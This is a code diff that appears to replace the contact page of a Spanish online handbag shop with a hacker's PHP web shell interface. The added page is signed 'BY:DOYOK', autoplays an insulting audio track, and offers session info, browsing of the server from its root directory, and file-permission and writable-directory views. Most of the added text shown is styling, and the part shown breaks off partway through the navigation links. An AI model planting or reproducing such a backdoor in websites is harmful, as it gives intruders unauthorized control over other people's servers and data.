+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        .code-preview {
+            background: #2b2b2b;
+            color: #f8f8f2;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+            margin: 10px 0;
+        }
+        
+        .sidebar-logo {
+            text-align: center;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .sidebar-logo h2 {
+            color: white;
+            font-size: 22px;
+            margin-bottom: 5px;
+        }
+        
+        .sidebar-logo p {
+            color: rgba(255,255,255,0.7);
+            font-size: 12px;
+        }
+        
+        .sidebar-section {
+            margin-bottom: 25px;
+        }
+        
+        .sidebar-section h4 {
+            color: white;
+            margin-bottom: 12px;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .sidebar-section h4 i {
+            color: var(--secondary);
+        }
+        
+        .sidebar-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        
+        .sidebar-btn {
+            background: rgba(255,255,255,0.1);
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            text-align: left;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+        }
+        
+        .sidebar-btn:hover {
+            background: rgba(255,255,255,0.2);
+            transform: translateX(5px);
+        }
+        
+        .sidebar-btn i {
+            width: 20px;
+            text-align: center;
+        }
+        
+        .info-row {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+            min-height: 20px;
+        }
+        
+        .info-label {
+            width: 140px;
+            flex-shrink: 0;
+            font-weight: 600;
+            color: var(--primary);
+        }
+        
+        .info-value {
+            flex: 1;
+            word-break: break-all;
+            color: var(--text-secondary);
+            font-weight: normal;
+        }
+        
+        .image-container {
+            width: 100%;
+            height: 80px; 
+            border-radius: 5px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+        
+        .full-size-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; 
+            display: block;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        
+        .status-online {
+            background: var(--success);
+        }
+        
+        .status-offline {
+            background: var(--accent);
+        }
+        
+        .card {
+            background: var(--card-bg);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 15px;
+            box-shadow: var(--shadow);
+            transition: var(--transition);
+        }
+        
+        .card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 12px rgba(0,0,0,0.1);
+        }
+        
+        .card-header {
+            display: flex;
+            justify-content: between;
+            align-items: center;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .card-title {
+            font-weight: 600;
+            color: var(--primary);
+            margin: 0;
+        }
+        
+        .writable-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-left: 5px;
+        }
+        
+        .writable-true {
+            background: var(--success);
+        }
+        
+        .writable-false {
+            background: var(--accent);
+        }
+        
+        .file-details {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            font-size: 11px;
+            color: var(--text-secondary);
+            margin-left: 10px;
+        }
+        
+        .file-detail-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .file-permission {
+            font-family: 'Roboto Mono', monospace;
+            background: #e9ecef;
+            padding: 1px 4px;
+            border-radius: 3px;
+            font-size: 10px;
+        }
+        
+        .current-dir-info {
+            background: var(--card-bg);
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            box-shadow: var(--shadow);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        
+        .dir-status {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .dir-writable {
+            background: #d4edda;
+            color: #155724;
+        }
+        
+        .dir-readonly {
+            background: #f8d7da;
+            color: #721c24;
+        }
 
-			
-			
-			<p class="woocommerce-FormRow woocommerce-FormRow--wide form-row form-row-wide form-row-username">
-				<label for="username">Username or email&nbsp;<span class="required" aria-hidden="true">*</span><span class="screen-reader-text">Obligatorio</span></label>
-				<input type="text" class="woocommerce-Input woocommerce-Input--text input-text" name="username" id="username" autocomplete="username" value="" required aria-required="true"/>
-			</p>
-			<p class="woocommerce-FormRow woocommerce-FormRow--wide form-row form-row-wide form-row-password">
-				<label for="password">Password&nbsp;<span class="required"  aria-hidden="true">*</span><span class="screen-reader-text">Obligatorio</span></label>
-				<input class="woocommerce-Input woocommerce-Input--text input-text" type="password" name="password" id="password" autocomplete="current-password" required aria-required="true"/>
-			</p>
+        .context-menu {
+            display: none;
+            position: absolute;
+            background: white;
+            border-radius: 5px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            z-index: 1000;
+            min-width: 180px;
+            overflow: hidden;
+        }
 
-			
-			<p class="form-row">
-				<input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="7a69ccffa9" /><input type="hidden" name="_wp_http_referer" value="/contacto" />								<button type="submit" class="woocommerce-button button woocommerce-form-login__submit" name="login" value="Log in">Log in</button>
-			</p>
+        .context-menu-item {
+            padding: 10px 15px;
+            cursor: pointer;
+            border-bottom: 1px solid #f0f0f0;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+        }
 
-			<div class="login-form-footer">
-				<a href="https://bolsomadrid.com/mi-cuenta/lost-password" class="woocommerce-LostPassword lost_password">Lost your password?</a>
-				<label class="woocommerce-form__label woocommerce-form__label-for-checkbox woocommerce-form-login__rememberme">
-					<input class="woocommerce-form__input woocommerce-form__input-checkbox" name="rememberme" type="checkbox" value="forever" /> <span>Remember me</span>
-				</label>
-			</div>
-			
-			
-			
-		</form>
+        .context-menu-item:hover {
+            background: #f8f9fa;
+        }
 
-						</div>
-				
-				<div class="register-question">
-					<span class="create-account-text">No account yet?</span>
-					<a class="btn btn-style-link" href="https://bolsomadrid.com/mi-cuenta?action=register">Create an Account</a>
-				</div>
-			</div>
-						<div class="mobile-nav">
-											<form role="search" method="get" id="searchform" class="searchform  basel-ajax-search" action="https://bolsomadrid.com/"  data-thumbnail="1" data-price="1" data-count="5" data-post_type="product" data-symbols_count="3" data-sku="1">
-				<div>
-					<label class="screen-reader-text">Search for:</label>
-					<input type="text" class="search-field" placeholder="Search for products" value="" name="s" id="s" />
-					<input type="hidden" name="post_type" id="post_type" value="product">
-										<button type="submit" id="searchsubmit" class="" value="Search">Search</button>
-				</div>
-			</form>
-			<div class="search-results-wrapper"><div class="basel-scroll"><div class="basel-search-results basel-scroll-content"></div></div></div>
-		<div class="menu-main-menu-espanol-container"><ul id="menu-main-menu-espanol" class="site-mobile-menu"><li id="menu-item-28798" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-28798 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/">Inicio</a></li>
-<li id="menu-item-1508" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-has-children menu-item-1508 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com">Categorías</a>
-<div class="sub-menu-dropdown color-scheme-dark">
+        .context-menu-item:last-child {
+            border-bottom: none;
+        }
 
+        .context-menu-item.danger {
+            color: var(--accent);
+        }
+
+        .selection-count {
+            background: var(--secondary);
+            color: white;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 11px;
+            margin-left: 5px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+            .sidebar {
+                width: 100%;
+                height: auto;
+                position: relative;
+            }
+            .file-item {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .file-actions {
+                margin-top: 10px;
+                width: 100%;
+            }
+            .file-info {
+                margin-left: 0px;
+                margin-top: 5px;
+            }
+            .tab-buttons {
+                flex-direction: column;
+            }
+            .tab-button {
+                margin-right: 0;
+                margin-bottom: 5px;
+                border-radius: 5px;
+            }
+            .tab-button.active::after {
+                display: none;
+            }
+            .breadcrumb {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .home-btn {
+                margin-left: 0;
+                margin-top: 10px;
+            }
+        }
+
+        .bkk {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-bottom: 10px;
+            transition: background-color 0.3s;
+            width: 100%;
+        }
+
+        .bkk:hover {
+            background-color: #45a049;
+        }
+
+        .bkk:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+
+        .icon {
+            margin-right: 5px;
+        }
+    </style>
+</head>
+<body>
 <div class="container">
-
-<ul class="sub-menu color-scheme-dark">
-	<li id="menu-item-6070" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6070 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/bolsos/">Bolsos</a></li>
-	<li id="menu-item-6068" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6068 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/bandoleras">Bandoleras</a></li>
-	<li id="menu-item-6071" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6071 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/bolsos-de-fiesta/">Bolsos de fiesta</a></li>
-	<li id="menu-item-6072" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6072 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/bolsos-de-nylon/">Bolsos de Nylon</a></li>
-	<li id="menu-item-6074" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6074 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/coleccion-de-piel/">Bolsos de piel</a></li>
-	<li id="menu-item-6073" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6073 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/carteras/">Carteras</a></li>
-	<li id="menu-item-6075" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6075 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/mochilas/">Mochilas</a></li>
-	<li id="menu-item-6076" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6076 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/momodamask/">Mascarillas</a></li>
-	<li id="menu-item-6077" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6077 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/rinoneras/">Riñoneras</a></li>
-	<li id="menu-item-6069" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6069 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/accesorios/">Accesorios</a></li>
-</ul>
-</div>
-</div>
-</li>
-<li id="menu-item-1513" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-1513 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/contacto/">Contacto</a></li>
-<li id="menu-item-1514" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1514 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/tienes-recargo-de-equivalencia/">Registro</a></li>
-<li id="menu-item-1515" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1515 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/mi-cuenta/">Mi Cuenta</a></li>
-</ul></div>			<div class="header-links my-account-with-username my-account-with-text">
-				<ul>
-												<li class="wishlist"><a href="https://bolsomadrid.com/contacto">Wishlist</a></li>
-											<li class="login-side-opener"><a href="https://bolsomadrid.com/mi-cuenta">Login / Register</a></li>
-									</ul>		
-			</div>
-					</div><!--END MOBILE-NAV-->
-						<div class="cart-widget-side">
-					<div class="widget-heading">
-						<span class="widget-title">Shopping cart</span>
-						<a href="#" rel="nofollow" class="widget-close">close</a>
-					</div>
-					<div class="widget woocommerce widget_shopping_cart"><div class="widget_shopping_cart_content"></div></div>				</div>
-			<div class="website-wrapper">
-					<div class="topbar-wrapp color-scheme-dark">
-			<div class="container">
-				<div class="topbar-content">
-					<div class="top-bar-left">
-						
-													<div class="gtranslate_wrapper" id="gt-wrapper-86743633"></div><i class="fa fa-phone-square" style="color:white"> </i> <B>CONTACTA AHORA:<span style="margin-left:10px">+34 677 777 880 (简体中文-English-Español) </B></span>												
-						
-					</div>
-					<div class="top-bar-right">
-						<div class="topbar-menu">
-							<div class="menu-main-menu-espanol-container"><ul id="menu-main-menu-espanol-1" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-28798 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/">Inicio</a></li>
-<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-has-children menu-item-1508 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com">Categorías</a>
-<div class="sub-menu-dropdown color-scheme-dark">
-
-<div class="container">
-
-<ul class="sub-menu color-scheme-dark">
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6070 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/bolsos/">Bolsos</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6068 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/bandoleras">Bandoleras</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6071 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/bolsos-de-fiesta/">Bolsos de fiesta</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6072 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/bolsos-de-nylon/">Bolsos de Nylon</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6074 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/coleccion-de-piel/">Bolsos de piel</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6073 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/carteras/">Carteras</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6075 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/mochilas/">Mochilas</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6076 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/momodamask/">Mascarillas</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6077 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/rinoneras/">Riñoneras</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6069 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/accesorios/">Accesorios</a></li>
-</ul>
-</div>
-</div>
-</li>
-<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-1513 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/contacto/">Contacto</a></li>
-<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1514 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/tienes-recargo-de-equivalencia/">Registro</a></li>
-<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1515 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/mi-cuenta/">Mi Cuenta</a></li>
-</ul></div>						</div>
-					</div>
-				</div>
-			</div>
-		</div> <!--END TOP HEADER-->
-	
-	
-	<!-- HEADER -->
-	<header class="main-header header-has-no-bg header-simple icons-design-line color-scheme-dark">
-
-		<div class="container">
-<div class="wrapp-header">
-			<div class="site-logo">
-				<div class="basel-logo-wrap switch-logo-enable">
-					<a href="https://bolsomadrid.com/" class="basel-logo basel-main-logo" rel="home">
-						<img src="https://bolsomadrid.com/wp-content/uploads/2021/09/IMG_5509.png" alt="Bolso Madrid" />					</a>
-																	<a href="https://bolsomadrid.com/" class="basel-logo basel-sticky-logo" rel="home">
-							<img src="https://bolsomadrid.com/wp-content/uploads/2021/09/IMG_5509.png" alt="Bolso Madrid" />						</a>
-									</div>
-			</div>
-					<div class="main-nav site-navigation basel-navigation menu-center" role="navigation">
-				<div class="menu-main-menu-espanol-container"><ul id="menu-main-menu-espanol-2" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-28798 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/">Inicio</a></li>
-<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-has-children menu-item-1508 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com">Categorías</a>
-<div class="sub-menu-dropdown color-scheme-dark">
-
-<div class="container">
-
-<ul class="sub-menu color-scheme-dark">
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6070 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/bolsos/">Bolsos</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6068 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/bandoleras">Bandoleras</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6071 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/bolsos-de-fiesta/">Bolsos de fiesta</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6072 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/bolsos-de-nylon/">Bolsos de Nylon</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6074 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/coleccion-de-piel/">Bolsos de piel</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6073 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/carteras/">Carteras</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6075 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/mochilas/">Mochilas</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6076 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/momodamask/">Mascarillas</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6077 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/rinoneras/">Riñoneras</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-6069 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/product-category/accesorios/">Accesorios</a></li>
-</ul>
-</div>
-</div>
-</li>
-<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-1513 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/contacto/">Contacto</a></li>
-<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1514 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/tienes-recargo-de-equivalencia/">Registro</a></li>
-<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1515 menu-item-design-default item-event-hover"><a href="https://bolsomadrid.com/mi-cuenta/">Mi Cuenta</a></li>
-</ul></div>			</div><!--END MAIN-NAV-->
-		<div class="right-column">
-			<div class="header-links my-account-with-username my-account-with-text">
-				<ul>
-												<li class="login-side-opener"><a href="https://bolsomadrid.com/mi-cuenta">Login / Register</a></li>
-									</ul>		
-			</div>
-					<div class="search-button basel-search-full-screen">
-				<a href="#" rel="nofollow" aria-label="Search">
-					<i class="fa fa-search"></i>
-				</a>
-				<div class="basel-search-wrapper">
-					<div class="basel-search-inner">
-						<span class="basel-close-search">close</span>
-									<form role="search" method="get" id="searchform" class="searchform  basel-ajax-search" action="https://bolsomadrid.com/"  data-thumbnail="1" data-price="1" data-count="5" data-post_type="product" data-symbols_count="3" data-sku="1">
-				<div>
-					<label class="screen-reader-text">Search for:</label>
-					<input type="text" class="search-field" placeholder="Search for products" value="" name="s" id="s" />
-					<input type="hidden" name="post_type" id="post_type" value="product">
-										<button type="submit" id="searchsubmit" class="" value="Search">Search</button>
-				</div>
-			</form>
-			<div class="search-results-wrapper"><div class="basel-scroll"><div class="basel-search-results basel-scroll-content"></div></div></div>
-							</div>
-				</div>
-			</div>
-					<div class="wishlist-info-widget">
-				<a href="https://bolsomadrid.com/contacto">
-					Wishlist 
-											<span class="wishlist-count icon-count">0</span>
-									</a>
-			</div>
-					<div class="mobile-nav-icon">
-				<span class="basel-burger"></span>
-			</div><!--END MOBILE-NAV-ICON-->
-		</div>
-</div>
-</div>
-
-	</header><!--END MAIN HEADER-->
-
-	<div class="clear"></div>
-	
-						<div class="main-page-wrapper">
-		
-						<div class="page-title page-title-default title-size-small title-design-centered color-scheme-light" style="">
-					<div class="container">
-						<header class="entry-header">
-							<h1 class="entry-title">Contacto</h1>							<div class="breadcrumbs" xmlns:v="https://schema.org/"><a href="https://bolsomadrid.com/" rel="v:url" property="v:title">Home</a> &raquo; <span class="current">Contacto</span></div><!-- .breadcrumbs -->						</header><!-- .entry-header -->
-					</div>
-				</div>
-			
-		<!-- MAIN CONTENT AREA -->
-				<div class="container">
-			<div class="row">
-		
-
-
-<div class="site-content col-sm-12" role="main">
-
-								<article id="post-1529" class="post-1529 page type-page status-publish hentry">
-
-					<div class="entry-content">
-						<p><strong>INFORMACIÓN DE CONTACTO</strong></p>
-<p>Si necesitas ayuda para registrarte en la pagina o hacernos cualquier consulta llámanos o envíanos un email.<span class="vc_icon_element-icon icon-envelope icons" style="float: left; font-size: 38px;"> </span>Tel: +34 683 252 018 / +34 677 777 779</p>
-<p>E-Mail: eurobolsosmadrid@gmail.com<span class="vc_icon_element-icon icon-cursor icons" style="float: left; font-size: 38px;"> </span></p>
-<p>C/ San Lorenzo 3A 28947, Fuenlabrada (Madrid).[<span class="vc_icon_element-icon icon-clock icons" style="float: left; font-size: 38px;"> </span>Att. al cliente de 10h &#8211; 19h</p>
-<p><span class="vc_icon_element-icon icon-rocket icons" style="float: left; font-size: 38px;"> </span>Envíos a España y Portugal- Consulta para otros destinos</p>
-											</div>
-
-					
-				</article><!-- #post -->
-
-				
-		
-</div><!-- .site-content -->
-
-
-
-					</div> <!-- end row -->
-			</div> <!-- end container -->
-					</div><!-- .main-page-wrapper --> 
-			
-	
-	<!-- FOOTER -->
-	<footer class="footer-container color-scheme-light">
-		
-			<div class="container main-footer">
-		<aside class="footer-sidebar widget-area row">
-									<div class="footer-column footer-column-1 col-md-3 col-sm-6">
-							<div id="text-2" class="footer-widget  widget_text">			<div class="textwidget"><p style="text-align:center;"><img src="https://bolsomadrid.com/wp-content/uploads/2021/09/IMG_5509.png" alt="Basel" title="BOLSOMADRID" style="max-width:150px;"/></p>
-<br>
-		    	</div>
-		</div>						</div>
-																	<div class="footer-column footer-column-2 col-md-3 col-sm-6">
-							<div id="text-12" class="footer-widget  widget_text"><h5 class="widget-title">Información</h5>			<div class="textwidget"><ul class="menu">
-<li><a href="https://bolsomadrid.com/contacto/">Contacto</a>
-</li>
-<li><a href="https://bolsomadrid.com/politica-de-cookies/">Política de Cookies</a></li>
-<li><a href="https://bolsomadrid.com/condiciones-de-venta-y-devolucion/">Condiciones de Compra</a></li>
-<li><a href="https://bolsomadrid.com/mi-cuenta/">Mi Cuenta</a></li>
-</ul></div>
-		</div>						</div>
-													<div class="clearfix visible-sm-block"></div>
-																	<div class="footer-column footer-column-3 col-md-3 col-sm-6">
-							<div id="text-13" class="footer-widget  widget_text"><h5 class="widget-title">Colecciones</h5>			<div class="textwidget"><ul class="menu">
-<li><a href="https://bolsomadrid.com/product-category/bolsos-de-fiesta/">Bolsos de Fiesta</a>
-
-</li>
-<li><a href="https://bolsomadrid.com/product-category/mochilas/">Mochilas</a></li>
-<li><a href="https://bolsomadrid.com/product-category/rinoneras/">Riñoneras</a></li>
-<li><a href="https://bolsomadrid.com/product-category/bandoleras/"> Bandoleras</a></li>
-</ul></div>
-		</div>						</div>
-																	<div class="footer-column footer-column-4 col-md-3 col-sm-6">
-							<div id="text-18" class="footer-widget  widget_text"><h5 class="widget-title">Dónde estamos</h5>			<div class="textwidget"><ul class="menu">
-<li>C/ San Lorenzo 3A
-</li>
-<li>28947 Fuenlabrada</li>
-<li>Polígono Cobocalleja</li>
-<li>Madrid</li></ul></div>
-		</div>						</div>
-													</aside><!-- .footer-sidebar -->
-	</div>
-	
-
-					<div class="copyrights-wrapper copyrights-centered">
-				<div class="container">
-					<div class="min-footer">
-						<div class="col-left">
-															<p>&copy; 2025 <a href="https://bolsomadrid.com/">Bolso Madrid</a>. All rights reserved</p>
-													</div>
-											</div>
-				</div>
-			</div>
-				
-	</footer>
-</div> <!-- end wrapper -->
-
-<div class="basel-close-side"></div>
-<!-- Root element of PhotoSwipe. Must have class pswp. -->
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    <!-- Background of PhotoSwipe. 
-         It's a separate element as animating opacity is faster than rgba(). -->
-    <div class="pswp__bg"></div>
-
-    <!-- Slides wrapper with overflow:hidden. -->
-    <div class="pswp__scroll-wrap">
-
-        <!-- Container that holds slides. 
-            PhotoSwipe keeps only 3 of them in the DOM to save memory.
-            Don't modify these 3 pswp__item elements, data is added later on. -->
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
+    <!-- Sidebar -->
+    <div class="sidebar">
+        <div class="sidebar-logo">
+            <div class="image-container">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBvN9t_Dc5tJ7dtSCeNpDULpjd_KFPhWX5tFB4XeFej6N4QFNkriicEu1f8ybXw19jtJG3WdjExnwdV0Tv4I74Ni85Z-lw855xOQJX3L4uQmR1AkcnpeOm49yjvAjIym9Dn8LsTz6g7GAzs1rNnYhFs7BYWKn49p9-rZ9cZj21G4h2KOf1cgSk437veyg/s500/redhead_001-2.gif" alt="Animated GIF" class="full-size-image">
+            </div>
+            <div>
+                <h2><i class="fas fa-terminal"></i>BY:DOYOK</h2>
+                <div class="header-icons">
+                    <a href="#" target="_blank" class="header-icon" title="GitHub">
+                        <i class="fab fa-github"></i>
+                    </a>
+                    <a href="#" target="_blank" class="header-icon" title="Telegram">
+                        <i class="fab fa-telegram"></i>
+                    </a>
+                    <a href="#" target="_blank" class="header-icon" title="Website">
+                        <i class="fas fa-globe"></i>
+                    </a>
+                    <p>Made By ./KING-UDUD</p>
+                </div>
+            </div>
         </div>
 
-        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
-        <div class="pswp__ui pswp__ui--hidden">
+        <style>
+        .bkk {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-bottom: 10px;
+            transition: background-color 0.3s;
+            width: 100%;
+        }
 
-            <div class="pswp__top-bar">
+        .bkk:hover {
+            background-color: #45a049;
+        }
 
-                <!--  Controls are self-explanatory. Order can be changed. -->
+        .bkk:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
 
-                <div class="pswp__counter"></div>
+        .icon {
+            margin-right: 5px;
+        }
+        </style>
 
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+        <audio id="myAudio" controls autoplay loop style="display: none;">
+            <source src="https://yokgercep.com/kemari-kau-bangsat.mp3" type="audio/mpeg">
+        </audio>
 
-                <button class="pswp__button pswp__button--share" title="Share"></button>
+        <button class="bkk" id="playBtn" onclick="playAudio()">
+            <span class="icon">▶</span> Play
+        </button>
 
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+        <script>
+        const audio = document.getElementById("myAudio");
+        const playBtn = document.getElementById("playBtn");
 
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+        function playAudio() {
+            if (audio.paused) {
+                audio.play();
+                playBtn.innerHTML = '<span class="icon">⏸</span> Jeda Musik';
+            } else {
+                audio.pause();
+                playBtn.innerHTML = '<span class="icon">▶</span> Putar Musik';
+            }
+        }
 
-                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
-                <!-- element will get class pswp__preloader--active when preloader is running -->
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                      <div class="pswp__preloader__cut">
-                        <div class="pswp__preloader__donut"></div>
-                      </div>
+        audio.addEventListener('ended', function() {
+            playBtn.innerHTML = '<span class="icon">▶</span> Putar Musik';
+        });
+        </script>
+        
+        <!-- Session Info Section -->
+        <div class="sidebar-section">
+            <h4><i class="fas fa-user-shield"></i> Session Info</h4>
+            <div class="sidebar-buttons">
+                <div class="sidebar-btn" style="background: rgba(52, 152, 219, 0.2);">
+                    <i class="fas fa-user"></i> 
+                    <div>
+                        <strong><?php echo htmlspecialchars($_SESSION['username']); ?></strong>
+                        <div style="font-size: 11px; opacity: 0.8;">
+                            Login: <?php echo date('H:i:s', $_SESSION['login_time']); ?>
+                        </div>
+                    </div>
+                </div>
+                <a href="?logout=true" class="sidebar-btn" style="background: rgba(231, 76, 60, 0.2); color: #e74c3c;">
+                    <i class="fas fa-sign-out-alt"></i> Logout
+                </a>
+            </div>
+        </div>
+        
+        <div class="sidebar-section">
+            <h4><i class="fas fa-folder-open"></i> Quick Navigation</h4>
+            <div class="sidebar-buttons">
+                <a href="?dir=<?php echo urlencode($home_dir); ?>" class="sidebar-btn">
+                    <i class="fas fa-home"></i> Home Directory
+                </a>
+                <a href="?dir=/" class="sidebar-btn">
